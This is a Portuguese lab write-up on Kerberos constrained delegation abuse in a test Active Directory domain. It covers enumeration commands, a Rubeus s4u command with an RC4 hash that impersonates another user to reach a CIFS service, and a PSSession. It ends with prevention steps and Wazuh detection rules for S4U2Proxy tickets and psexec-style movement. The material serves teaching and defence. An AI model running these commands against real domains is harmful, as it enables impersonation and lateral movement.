👉 [Explicação](#explicação)  
⚙️ [Configuração](#configuração)  
⚠️ [Ataque](#ataque)  
🛡️ [Prevenção](#prevenção)  
📊 [Detecção](#detecção)

## Explicação
Se um usuário ou computador tiver permissão para “Delegação Restrita”, ele poderá se passar por qualquer usuário para acessar alguns serviços em um computador.
Então, se você comprometer o hash desse usuário/computador, poderá se passar por qualquer usuário (até mesmo administradores de domínio) para acessar alguns serviços.


## Configuração
### Configuracao com Protocol Transition 
<img width="936" height="848" alt="" src="https://github.com/user-attachments/assets/577b7c01-6fc9-4416-bbea-91a933d1a683" />

## #Configuracao sem Protocol Transition 
  <img width="955" height="857" alt="" src="https://github.com/user-attachments/assets/0ce8f95f-b4b0-4e97-b685-1b81cbe98080" />

##Ataque
### Procurar delegacoes
- windows
<img width="735" height="630" alt="win" src="https://github.com/user-attachments/assets/f1ec9d02-d4b1-42a0-bdce-ff9dc81822b5" />

- linux
<img width="1035" height="243" alt="li" src="https://github.com/user-attachments/assets/29774bd0-ac10-42fb-8ddf-30f5d792cb88" />

### Com Protocol Transition PoC
<img width="1918" height="620" alt="poc-impacket" src="https://github.com/user-attachments/assets/58001aa8-2ead-4620-8697-b6df5cc215be" />

### Sem Protocol Transition 
Depois de desativar a Transição de Protocolo, o ataque direto falhará. A razão é que, sem essa opção, o ticket que fcastle obtém para si mesmo em nome de outro usuário (via S4U2Self) não é “encaminhável”. Como não pode ser reencaminhado, a etapa S4U2Proxy não funciona. É como se o DC dissesse: “Sei que você diz que o Administrador se conectou a você, mas como não foi com Kerberos, não vou deixar você usar essa identidade para se conectar a outro lugar”.
<img width="1917" height="243" alt="noforward" src="https://github.com/user-attachments/assets/e288d731-0cae-4850-9bfa-75cd0013531f" />
Você precisa de uma estratégia diferente. A mais comum é usar um ataque de Delegação Baseada em Recursos Restritos (Resource-Based Constrained Delegation).


---

## Windows
- Enumeracao com Powerview
```Get-NetUser -TrustedToAuth```
- Sem Powerview (nativo)
```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```
<img width="908" height="708" alt="wind-find-del" src="https://github.com/user-attachments/assets/fe23cabb-ddc1-4f92-a4ee-650df36ab0ed" />

```Rubeus.exe hash /password:MYpassword#```
<img width="1058" height="439" alt="hash-pass" src="https://github.com/user-attachments/assets/a1cf4c8b-4c6a-4a53-b155-d777ba9a69b0" />

```.\Rubeus.exe s4u /user:fcastle /rc4:1D113F07D3425C43D4E35770BC773A95 /domain:MARVEL.local /impersonateuser:pparker /msdsspn:"cifs/SPIDERMAN" /dc:HYDRA-DC.MARVEL.local /ptt```

```klist```
<img width="1140" height="403" alt="klistspiderman" src="https://github.com/user-attachments/assets/0548ebd5-f5dd-4d99-bde5-50c1884c36e1" />

```Enter-PSSession SPIDERMAN```   
como meu usuario nao tem permisos privilegiados so posso listar recursos que tem acceso
<img width="1008" height="312" alt="dir" src="https://github.com/user-attachments/assets/cda21e4d-bf6a-428d-81fc-22429e7bee37" />



## Prevenção
- Configure a propriedade A conta é confidencial e não pode ser delegada para todos os usuários privilegiados.
- Adicione usuários privilegiados ao grupo Usuários protegidos: essa associação aplica automaticamente a proteção mencionada acima (no entanto, não é recomendável usar Usuários protegidos sem primeiro entender suas possíveis implicações).


## Detecção
```
<group name="windows,sysmon,delegation_attack,">

  <!-- Rule 1: Detecção no DC (HYDRA-DC) - Evento 4769 com opções suspeitas de delegação -->
  <rule id="100200" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4769$</field>
    <!-- CORRIGIDO: ServiceName deve conter SPIDERMAN (sem $) pois é o serviço alvo -->
    <field name="win.eventdata.ServiceName" type="pcre2">(?i)(cifs/SPIDERMAN|SPIDERMAN)</field>
    <field name="win.eventdata.TicketOptions" type="pcre2">^0x40800000$|^0x40810000$</field>
    <field name="win.eventdata.TicketEncryptionType">^0x17$</field>
    <!-- OPCIONAL: Filtrar pelo usuário que está sendo impersonado (pparker) -->
    <field name="win.eventdata.TransmittedServices" type="pcre2">(?i).*pparker.*</field>
    <description>Windows Security: Possível abuso de Constrained Delegation - Ticket para SPIDERMAN solicitado com opções S4U2Proxy</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>

  <!-- Rule 2: Detecção no SPIDERMAN - Criação de serviço remoto (psexec) -->
  <rule id="100201" level="12">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.parentImage" type="pcre2">(?i).*services\.exe</field>
    <field name="win.eventdata.image" type="pcre2">(?i).*\\temp\\[a-z0-9]{8}\.exe</field>
    <description>Sysmon: Possível lateral movement via psexec apos delegacao</description>
  </rule>

  <!-- Rule 3: Detecção no SPIDERMAN - Upload via ADMIN$ -->
  <rule id="100202" level="10">
    <if_group>sysmon_event11</if_group>
    <field name="win.eventdata.image">.*\\svchost\.exe</field>
    <field name="win.eventdata.targetFilename" type="pcre2">(?i).*ADMIN\$\\temp\\[a-z0-9]{8}\.exe</field>
    <description>Sysmon: Upload de binario via ADMIN$ (padrao psexec)</description>
  </rule>

  <!-- Rule 4: Correlação - Ticket no DC + Acesso no SPIDERMAN = Ataque confirmado -->
  <rule id="100203" level="15" frequency="2" timeframe="300">
    <if_matched_sid>100200,100201</if_matched_sid>
    <description>CRITICO: Ataque de Constrained Delegation confirmado - Ticket forjado + lateral movement</description>
  </rule>

</group>
```
<img width="1918" height="564" alt="wazuhcd" src="https://github.com/user-attachments/assets/fabc14a4-f73a-4157-9dd5-0eda86eae379" />

